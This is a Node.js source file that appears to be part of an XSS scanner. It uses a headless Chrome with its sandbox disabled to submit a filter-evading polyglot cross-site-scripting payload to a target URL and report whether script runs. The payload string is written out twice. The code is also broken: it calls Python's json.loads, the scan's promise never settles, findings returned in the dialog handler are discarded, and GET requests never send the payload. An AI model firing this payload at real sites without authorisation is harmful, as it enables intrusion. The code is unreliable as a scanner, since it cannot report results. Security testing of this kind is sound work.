const puppeteer = require('puppeteer');

// Spawns a client to visit the provided url with a malicious data submission to see if XSS (javascript execution) is possible.
// For now, you can only define jobs to visit specific endpoints. Automatic detection / support for endpoint lists and options to navigate to
// other pages where input may be reflected may come in the future.

// A polygot XSS payload, capable of getting past many XSS filters

exports.xssScan = async (url, reqType, dataType) => {
    // A polygot XSS payload, capable of getting past many XSS filters
    let payload = encodeURIComponent("jaVasCript:/*-/*`/*\\`/*'/*\"/**/(/* */oNcliCk=alert() )//%0D%0A%0d%0a//</stYle/</titLe/</teXtarEa/</scRipt/--!>\\x3csVg/<sVg/oNloAd=alert()//>\\x3e");
    if(dataType === "base64") {
        payload = btoa(payload);
    } else if (dataType === "JSON") {
        // todo: add an option for them to provide a name/key to the data.
        payload = json.loads("{data: " + payload + "}");
    }

    return new Promise(async (res,rej)=>{
        const browser = await puppeteer.launch({
            executablePath: '/usr/bin/google-chrome-stable',
            args: ['--no-sandbox']
        });
        const page = await browser.newPage();
        page.on('dialog', async dialog => {
            // XSS is possible! 
            await dialog.accept();
            return [{
                "category": "XSS (Cross Site Scripting)",
                "payload": "jaVasCript:/*-/*`/*\\`/*'/*\"/**/(/* */oNcliCk=alert() )//%0D%0A%0d%0a//</stYle/</titLe/</teXtarEa/</scRipt/--!>\\x3csVg/<sVg/oNloAd=alert()//>\\x3e",
                "recommendations": "Perform sanitization of user input, create a CSP security policy, and/or avoid reflection of user input on the page."
            }]
        })

        // Simple payload submission in the parameter
        if(reqType === "GET" || reqType === "DELETE") {
            await page.goto(url);
        } else {
            await page.setRequestInterception(true);
            page.on('request', interceptedRequest => {
                var data = {
                    'method': 'POST',
                    'postData': payload
                };
                interceptedRequest.continue(data);
            });
            await page.goto(url);
        }
        await new Promise((resolve) => setTimeout(resolve, 2000));
        await browser.close()
        return [];
    })
}